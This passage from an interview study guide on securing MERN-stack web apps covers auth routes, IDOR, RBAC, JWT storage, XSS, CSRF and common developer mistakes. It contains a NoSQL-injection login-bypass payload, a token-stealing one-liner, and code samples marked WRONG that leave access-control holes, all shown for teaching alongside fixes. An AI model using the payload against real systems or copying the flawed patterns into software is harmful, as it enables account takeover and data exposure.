// ─── LOGOUT ──────────────────────────────────────────────────────
// POST /api/auth/logout
// If using cookies: clear the cookie
res.clearCookie('token');
res.json({ message: 'Logged out successfully' });
// If using localStorage: client-side only (remove token from storage)
```

---

### Protecting Admin Routes

```javascript
// This is the full pattern you should use for admin-only endpoints

const protect = require('../middleware/auth');
const authorize = require('../middleware/authorize');

// Anyone can view products
router.get('/products', getProducts);

// Only logged-in users can add to cart
router.post('/cart', protect, addToCart);

// Only admins can manage products
router.post('/products', protect, authorize('admin'), createProduct);
router.put('/products/:id', protect, authorize('admin'), updateProduct);
router.delete('/products/:id', protect, authorize('admin'), deleteProduct);

// Only admins and moderators can review reports
router.get('/reports', protect, authorize('admin', 'moderator'), getReports);
```

---

### Preventing Insecure Direct Object Reference (IDOR)

IDOR is when a user accesses another user's data by changing an ID in the URL.

```javascript
// WRONG — any logged-in user can read any user's data by guessing IDs
router.get('/orders/:orderId', protect, async (req, res) => {
    const order = await Order.findById(req.params.orderId);
    res.json(order);
});

// CORRECT — only the owner can access their own order
router.get('/orders/:orderId', protect, async (req, res) => {
    const order = await Order.findOne({
        _id: req.params.orderId,
        userId: req.user.userId   // must belong to the logged-in user
    });

    if (!order) {
        return res.status(404).json({ message: 'Order not found' });
        // Note: return 404, not 403 — don't confirm the order exists to unauthorized users
    }

    res.json(order);
});
```

---

### Handling Sensitive Data in Responses

```javascript
// WRONG — password hash sent to frontend
const user = await User.findById(id);
res.json(user);   // includes password field!

// CORRECT — exclude sensitive fields
const user = await User.findById(id).select('-password -resetToken -__v');
res.json(user);

// In Mongoose Schema — you can mark fields as not included by default
const userSchema = new mongoose.Schema({
    email: String,
    password: { type: String, select: false },   // excluded from queries by default
    role: { type: String, default: 'user' }
});
```

---

> **Key Takeaways — Section 9**
> - Login: validate → find user → bcrypt.compare → sign JWT → return (exclude password).
> - Logout: clear cookie server-side. Don't just delete from localStorage.
> - IDOR prevention: always filter by both `_id` AND `userId: req.user.userId`.
> - Always use `.select('-password')` — never send the password hash to the frontend.
> - Admin routes: always double-check with `protect` AND `authorize('admin')`.

---

## 10. Common Interview Questions

**Q1: What is XSS and how do you prevent it in a MERN app?**
> XSS (Cross-Site Scripting) is an attack where malicious JavaScript is injected into web pages and executed by other users' browsers. An attacker might post a comment containing a `<script>` tag that steals cookies or tokens.
>
> Prevention in MERN: (1) React's JSX automatically escapes HTML — never use `dangerouslySetInnerHTML` with unvalidated input. (2) Use `xss-clean` middleware in Express to sanitize all incoming request data. (3) Use `helmet()` which sets a Content Security Policy header. (4) Store JWTs in `httpOnly` cookies so scripts cannot access them even if XSS occurs.

---

**Q2: What is the difference between authentication and authorization?**
> Authentication answers "who are you?" — it verifies your identity, typically through email and password. Authorization answers "what can you do?" — it checks what actions or resources you are permitted to access after you are authenticated.
>
> Example: Logging in is authentication. Being allowed to access the admin dashboard (because your role is "admin") is authorization. In Express, authentication middleware verifies the JWT, and authorization middleware checks the user's role. HTTP 401 = not authenticated. HTTP 403 = authenticated but not authorized.

---

**Q3: JWT vs Sessions — what is the difference?**
> **JWT (stateless):** The server generates a token containing user info (userId, role), signed with a secret key. The token is stored on the client and sent with every request. The server verifies the signature — no database lookup needed. Good for microservices, APIs, and mobile apps.
>
> **Sessions (stateful):** The server stores session data in memory or a database. The client receives a session ID in a cookie. Every request requires a database lookup to get session data. More memory-intensive but easier to invalidate (just delete the session from the database).
>
> In MERN apps, JWT is more common because it is stateless and works well with REST APIs. Sessions are better when you need to invalidate tokens instantly (e.g., banking apps).

---

**Q4: How do you secure APIs in Node.js/Express?**
> A complete API security setup includes: (1) `helmet()` for security headers. (2) `cors()` configured to only allow your frontend domain. (3) `express-rate-limit` on all endpoints, especially login. (4) JWT auth middleware on all protected routes. (5) `express-validator` to validate all inputs. (6) `express-mongo-sanitize` and `xss-clean` to sanitize inputs. (7) `bcryptjs` for password hashing. (8) All secrets in `.env`, never in code. (9) RBAC middleware for role-based access. (10) Always use `.select('-password')` in user queries.

---

**Q5: What is CSRF and how do you prevent it?**
> CSRF (Cross-Site Request Forgery) tricks a user's browser into making unwanted requests to a site where they are already logged in, using their active session/cookies.
>
> Example: User is logged into a banking app. Attacker sends a link to a page that has a hidden form auto-submitting a money transfer. The browser sends the user's cookie with the request — the bank processes it as legitimate.
>
> Prevention: (1) Use `SameSite: 'strict'` on cookies — the browser won't send cookies on cross-site requests. (2) Use CSRF tokens — a unique token per session that must be included in state-changing requests. (3) If using JWT in Authorization headers (not cookies), CSRF cannot occur because browsers cannot automatically set custom headers cross-site.

---

**Q6: Where should you store JWT tokens in a React app?**
> The safest option is `httpOnly` cookies. These cookies cannot be read by JavaScript — so even if an XSS attack occurs, the attacker's script cannot steal the token. You set `httpOnly: true, secure: true, sameSite: 'strict'` when sending the cookie from Express.
>
> `localStorage` is simpler but less secure — any JavaScript running on the page (including injected scripts from XSS) can read `localStorage`. For web applications, always prefer httpOnly cookies. For mobile or native apps, secure storage mechanisms are used.

---

**Q7: What is SQL Injection and does it apply to MongoDB?**
> SQL Injection is inserting malicious SQL commands into a query string to manipulate the database. The equivalent in MongoDB is NoSQL Injection — attackers inject MongoDB query operators like `$gt` or `$ne` into JSON request bodies.
>
> For example: `{ email: { "$gt": "" }, password: { "$gt": "" } }` would match all users and bypass authentication. Prevention: use `express-mongo-sanitize` which strips `$` and `.` from request data, and validate that inputs are the correct type (strings, not objects) using Joi or express-validator.

---

**Q8: What is bcrypt and why do we use it for passwords?**
> `bcrypt` is a password hashing algorithm specifically designed for passwords. We use it instead of plain storage because databases get breached. We use bcrypt instead of MD5/SHA1 because: (1) bcrypt is intentionally slow, making brute-force attacks impractical. (2) It automatically generates a random salt, so identical passwords produce different hashes. (3) The cost factor can be increased as hardware gets faster.
>
> In Node.js: `bcrypt.hash(password, 12)` to hash on registration, and `bcrypt.compare(plainPassword, hash)` to verify on login. We never store the original password or log it anywhere.

---

**Q9: What is RBAC and how do you implement it in Express?**
> RBAC (Role-Based Access Control) is a method of restricting access based on user roles. Common roles are `user`, `admin`, `moderator`. Each role has defined permissions.
>
> Implementation: (1) Store the role in MongoDB (`role: { type: String, default: 'user' }`). (2) Include the role in the JWT payload on login. (3) Create an `authorize(...roles)` middleware that checks if `req.user.role` is in the allowed roles array. (4) Apply `protect` (auth) then `authorize('admin')` to protected routes. If the role doesn't match, return 403 Forbidden.

---

**Q10: What does `helmet()` do in Express?**
> `helmet()` is a middleware package that automatically sets several important HTTP security headers in every response. These include: `X-XSS-Protection` (tells browsers to block XSS), `X-Content-Type-Options: nosniff` (prevents MIME type sniffing), `X-Frame-Options: DENY` (prevents clickjacking), `Content-Security-Policy` (controls which resources can be loaded), `Strict-Transport-Security` (forces HTTPS), and others. One line — `app.use(helmet())` — gives you 10+ security improvements.

---

> **Key Takeaways — Section 10**
> - Know XSS, CSRF, SQL/NoSQL Injection definitions and prevention cold.
> - Be able to explain JWT vs Sessions clearly.
> - Know authentication vs authorization (including HTTP status codes: 401 vs 403).
> - Be able to list your complete Express security middleware stack.
> - Explain bcrypt: hash on register, compare on login, never store plain passwords.

---

## 11. Common Mistakes Fresh Developers Make

### Mistake 1: Storing JWT in localStorage

**What happens:** Developer stores the JWT in `localStorage` for simplicity.

**Why it is dangerous:** Any JavaScript running on the page can access `localStorage`. If an XSS vulnerability exists anywhere on the site, attackers can run `localStorage.getItem('token')` and steal the token with a single line of code.

**Fix:** Use `httpOnly` cookies. The browser manages them automatically and JavaScript cannot read them.

```javascript
// Instead of: localStorage.setItem('token', jwtToken)
// Use on the Express side:
res.cookie('token', jwtToken, { httpOnly: true, secure: true, sameSite: 'strict' });
```

---

### Mistake 2: Not Validating Inputs on the Backend

**What happens:** Developer adds client-side validation in React (nice for UX) but does no server-side validation in Express.

**Why it is dangerous:** Attackers do not use your React form. They send raw HTTP requests directly to your API using Postman, curl, or scripts — completely bypassing any client-side validation.

**Fix:** Always validate on the backend with `express-validator` or `Joi`. Client-side validation is for UX only, never for security.

```javascript
// Server must always validate independently:
body('email').isEmail().withMessage('Valid email required')
body('password').isLength({ min: 8 }).withMessage('Min 8 characters')
```

---

### Mistake 3: Exposing Backend Secrets in Frontend Code

**What happens:** Developer puts API keys, database URLs, or secrets in React's `.env` file or directly in JavaScript code.

**Why it is dangerous:** React builds are public. Variables in React code (including `REACT_APP_` prefixed variables) are bundled and visible to anyone who opens the browser's DevTools → Sources.

**Fix:** All secrets belong on the backend in Node.js's `.env`. React should only know your backend's URL (`REACT_APP_API_URL=http://localhost:5000`), never secret keys.

---

### Mistake 4: No Rate Limiting on Login Routes

**What happens:** Developer builds a working login system but forgets rate limiting.

**Why it is dangerous:** A bot can try thousands of email/password combinations per minute on your `/api/auth/login` endpoint — a brute force attack. Without rate limiting, the only defense is your users having strong passwords.

**Fix:** Apply strict rate limiting specifically to auth routes — max 10 requests per 15 minutes per IP.

---

### Mistake 5: Missing RBAC — No Role Checking

**What happens:** Developer only checks if the user is logged in (authenticated) but never checks their role (authorized).

**Why it is dangerous:** Any logged-in user can access admin endpoints, delete other users' data, or approve orders they shouldn't see.

```javascript
// WRONG — any logged-in user can delete any other user
router.delete('/user/:id', protect, deleteUserController);

// CORRECT — only admins can delete users
router.delete('/user/:id', protect, authorize('admin'), deleteUserController);
```

**Fix:** Always add `authorize()` middleware to sensitive routes, not just `protect`.

---

### Mistake 6: Sending Passwords Back in API Responses

**What happens:** Developer queries a user from MongoDB and sends the entire document including the hashed password back in the response.

**Why it is dangerous:** Even a bcrypt hash leaks information. It confirms the user exists, reveals the hash algorithm used, and gives attackers data to attempt offline cracking.

```javascript
// WRONG
const user = await User.findById(id);
res.json(user);   // sends password field!

// CORRECT
const user = await User.findById(id).select('-password');
res.json(user);
```

---

### Mistake 7: Committing `.env` to GitHub

**What happens:** Developer creates the `.env` file but forgets to add it to `.gitignore` before the first commit.

**Why it is dangerous:** All secrets are now in Git history. Even after deleting the file, the history still contains them. Automated bots scan GitHub for exposed credentials 24/7.

**Fix:**
```
# .gitignore (create BEFORE any git add)
.env
.env.local
.env.production
node_modules/
```

And if it has already been committed: rotate all keys immediately (regenerate them from the provider's dashboard) and purge Git history.

---

> **Key Takeaways — Section 11**
> - The 7 most critical mistakes: localStorage for tokens, no server-side validation, secrets in frontend, no rate limiting, no RBAC, sending password in responses, committing `.env`.
> - Every single one of these is a common interview topic — be able to explain and fix each one.
> - Start every MERN project with the security stack set up first, before writing business logic.

---

## 12. Final Revision Cheat Sheet

Use this the morning of your interview.

---

### Core Security Concepts — Quick Definitions

| Concept | One-Line Definition |
|---|---|
| Authentication | Verifying identity (who you are) |
| Authorization | Verifying permissions (what you can do) |
| JWT | Signed token with user info, used for stateless auth |
| httpOnly Cookie | Cookie that JavaScript cannot access (XSS protection) |
| XSS | Injecting malicious scripts into web pages |
| CSRF | Tricking user's browser into making unwanted requests |
| SQL Injection | Injecting SQL commands through input fields |
| NoSQL Injection | Injecting MongoDB operators (`$gt`, `$ne`) through JSON body |
| bcrypt | Password hashing algorithm with salt and configurable work factor |
| Salt | Random data added to a password before hashing (prevents rainbow tables) |
| RBAC | Restricting access based on user roles (user, admin, moderator) |
| Rate Limiting | Limiting requests per time window to prevent brute force |
| CORS | Browser rule controlling which domains can call your API |
| helmet() | Express middleware that sets 10+ security HTTP headers |
| IDOR | Accessing another user's data by changing IDs in the URL |
| CSP | Content Security Policy — controls which scripts can run on a page |

---

### Status Codes

| Code | Meaning | When to use |
|---|---|---|
| 400 | Bad Request | Validation failed, malformed input |
| 401 | Unauthorized | Not authenticated (no token or invalid token) |
| 403 | Forbidden | Authenticated but not authorized (wrong role) |
| 404 | Not Found | Resource doesn't exist (also use for IDOR — don't confirm it exists) |
| 429 | Too Many Requests | Rate limit exceeded |
| 500 | Server Error | Unexpected server error |

---

### The #1 Rules

```
Passwords:    NEVER store plain text. ALWAYS use bcrypt.
Secrets:      NEVER in React code. ALWAYS in Node.js .env.
JWT storage:  NEVER localStorage for web apps. ALWAYS httpOnly cookie.
AI API calls: NEVER from React. ALWAYS from Express backend.
Inputs:       NEVER trust. ALWAYS validate AND sanitize.
Admin routes: ALWAYS use protect + authorize('admin').
```

---

### Express Security Stack (Memorize This Order)

```javascript
app.use(helmet());                    // 1. Security headers
app.use(cors({ origin: FRONT_URL })); // 2. Only allow your frontend
app.use(express.json({ limit:'10kb'})); // 3. Body parsing with size limit
app.use(mongoSanitize());             // 4. Block NoSQL injection
app.use(xssClean());                  // 5. Sanitize XSS in inputs
app.use('/api', rateLimiter);         // 6. Rate limit all routes
// Then your routes with protect + authorize middleware per route
```

---

### Authentication vs Authorization Summary

| | Authentication | Authorization |
|---|---|---|
| Question | Who are you? | What can you do? |
| Middleware | `protect` (verifies JWT) | `authorize('admin')` (checks role) |
| Failure code | 401 Unauthorized | 403 Forbidden |
| Order | First | Second |

---

### JWT Quick Reference

```
Structure:   HEADER.PAYLOAD.SIGNATURE
Payload:     Readable (not encrypted) — store userId, role only
Signature:   Only server can create/verify — uses JWT_SECRET from .env
Expiry:      Always set expiresIn ('7d', '1h', etc.)
Storage:     httpOnly cookie (web) > localStorage (avoid)
Verify:      jwt.verify(token, process.env.JWT_SECRET)
```

---

### XSS Prevention — Quick List

- React JSX escapes automatically (`{variable}` is safe)
- Never use `dangerouslySetInnerHTML` with user input
- Use `DOMPurify.sanitize()` if you must render HTML
- Use `xss-clean` middleware in Express
- Use `helmet()` for Content Security Policy headers
- Store tokens in httpOnly cookies (not localStorage)

---

### CSRF Prevention — Quick List

- Set `sameSite: 'strict'` on cookies
- Use JWT in Authorization header instead of cookies
- Use CSRF tokens for critical state-changing operations
- Validate `Origin` or `Referer` headers

---

### Password Security — Quick Steps

```javascript
// Register
const hash = await bcrypt.hash(password, 12);  // hash it
await User.create({ email, password: hash });    // store hash

// Login
const match = await bcrypt.compare(plain, hash); // compare
if (!match) return res.status(401).json({ message: 'Invalid email or password' });

// Response — always exclude password
const user = await User.findById(id).select('-password');
```

---

### Interview Answer Framework

When asked "How do you secure your MERN application?":

```
1. "In Express, I use helmet() for security headers and cors() restricted to my frontend domain"
2. "Rate limiting with express-rate-limit on all routes, stricter on login"
3. "Input validation with express-validator and sanitization with express-mongo-sanitize and xss-clean"
4. "JWT authentication middleware on every protected route"
5. "RBAC with an authorize() middleware that checks user roles"
6. "Passwords hashed with bcrypt (cost factor 12)"
7. "All secrets in .env, never in code or frontend"
8. "JWTs stored in httpOnly cookies to prevent XSS token theft"
9. "Always .select('-password') when returning user documents"
```

---

### Security Packages — One-Line Reference

| Package | One Line Purpose |
|---|---|
| `helmet` | Sets security HTTP headers automatically |
| `cors` | Restricts API access to allowed frontend domains |
| `express-rate-limit` | Limits requests per IP/user per time window |
| `express-mongo-sanitize` | Strips MongoDB operators from request data |
| `xss-clean` | Encodes HTML in request inputs |
| `express-validator` | Validates and sanitizes specific input fields |
| `bcryptjs` | Hashes and compares passwords securely |
| `jsonwebtoken` | Creates and verifies JWT tokens |
| `dotenv` | Loads secrets from .env into process.env |

---

> **Final Note for Pakistani Software Company Interviews**
>
> Companies like Arbisoft, 10Pearls, Systems Ltd, Netsol, Devsinc, and Folio3 regularly ask security questions in MERN developer interviews. Fresh graduates who demonstrate:
>
> 1. Understanding of XSS and CSRF (with prevention techniques)
> 2. Proper JWT implementation (httpOnly cookies, not localStorage)
> 3. Secure Express middleware stack (helmet, rate limit, sanitize, validate)
> 4. Password hashing with bcrypt (never plain text)
> 5. RBAC implementation with protect + authorize middleware
>
> ...will stand out from the majority who treat security as an afterthought.
>
> Security is not a bonus feature — it is a core engineering skill. Every line of code you write is either secure or insecure. This guide gives you everything you need to write secure MERN applications from day one.

---

*End of Cybersecurity for MERN Stack Developers Study Guide*
